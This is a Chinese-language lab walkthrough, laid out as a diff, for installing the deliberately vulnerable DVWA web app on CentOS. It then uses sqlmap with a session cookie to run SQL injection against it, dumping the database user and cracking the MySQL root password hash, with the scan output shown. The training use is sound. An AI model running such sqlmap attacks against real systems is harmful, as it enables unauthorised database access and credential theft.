@@ -1,0 +1,120 @@
+搭建环境：CentOS6.5
+使用阿里镜像云
+
+yum -y install httpd mysql mysql-server php php-mysql php-gd
+
+去官网下载DVWA    http://www.dvwa.co.uk/
+
+unzip DVWA-master.zip
+
+mv DVWA-master /var/www/html/DVWA
+
+service httpd start
+
+service mysqld start
+
+mysqladmin -u root password "123456"
+
+cd DVWA/
+
+DVWA配置
+
+配置 mysql 用户名和密码
+
+cp config/config.inc.php.dist config/config.inc.php
+
+vim config/config.inc.php
+
+$_DVWA[ 'db_password' ] = 'p@ssw0rd';    改成：
+
+$_DVWA[ 'db_password' ] = '123456';
+
+用浏览器访问dvwa网站
+
+两个红色错误
+
+  PHP function allow_url_include: Disabled
+
+  reCAPTCHA key: Missing
+
+第一个错误需要在php.ini配置文件开启对应的函数即可
+
+vim /etc/php.ini  搜 allow_url_include 将
+
+allow_url_include = Off 改成：
+
+allow_url_include = On  不重启服务刷配置文件
+
+service httpd graceful
+
+第二个缺失reCAPTCHA 密钥
+
+  相关资料：
+  CMU设计一个叫reCAPTCHA 强大系统，让电脑向人求助：
+  将OCR软件无法识别的文字扫描图传给世界各大网站，用以替换原来的验证码图片
+  那些网站的用户在正确识别出这些文字后，会将答案传给CMU，说白就是验证码
+
+在配置文件config/config.inc.php中有两个变量，公钥和私钥，
+需要到 https://www.google.com/recaptcha/admin/create 去申请一个，也可以直接使用下面的
+
+主要用于生成
+
+$_DVWA[ 'recaptcha_public_key' ]  = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';
+$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';
+
+搞定后继续访问DVWA，点击下面的按钮 Create/Reset Database 按钮就搞定了
+
+登录的账号密码是 admin password
+
+DVWA Security 等级调成low
+
+sqlmap 下测验，使用cookie对DVWA其注入
+
+点SQL Injection 注入模块
+
+打开Tamper data 插件Start Tamper，然后在注入框随便填写一些信息抓cookie值
+
+注意保持长连接不需要关闭tamper data弹出的界面，将cookie值放到sqlmap 上跑一下：
+
+  sqlmap一些参数：
+  -u 指定目标的URL 也就是sql注入点
+  --cookie 当前会话的cookie值
+  -b 获取数据库类型
+  --current-db  获取当前数据库
+  --current-user 获取当前登录的用户
+
+sqlmap.py -u "192.168.10.100/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" 
+--cookie "security=low; PHPSESSID=3cng17ijctn2g5djirllsfjcn1" -b --current-db
+
+扫描结果：
+
+  [19:59:09] [INFO] the back-end DBMS is MySQL
+  [19:59:09] [INFO] fetching banner
+  web server operating system: Linux CentOS 6.5
+  web application technology: PHP 5.3.3, Apache 2.2.15
+  back-end DBMS: MySQL 5.0
+  banner:    '5.1.73'
+  [19:59:02] [INFO] fetching current user
+  [19:59:02] [WARNING] reflective value(s) found and filtering out
+  current user:    'root@localhost'
+  [19:59:09] [INFO] fetching current database
+  current database:    'dvwa'
+
+sqlmap.py -u "192.168.10.100/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie "security=low; PHPSESSID=3cng17ijctn2g5djirllsfjcn1" --users --password
+
+扫描结果：
+
+    [20:07:25] [INFO] cracked password '123456' for user 'root'
+    database management system users password hashes:
+    [*] root [2]:
+    password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+    clear-text password: 123456
+    password hash: NULL
+
+查看CPU的负载
+
+  vmstat 1 10
+
+  
+
+
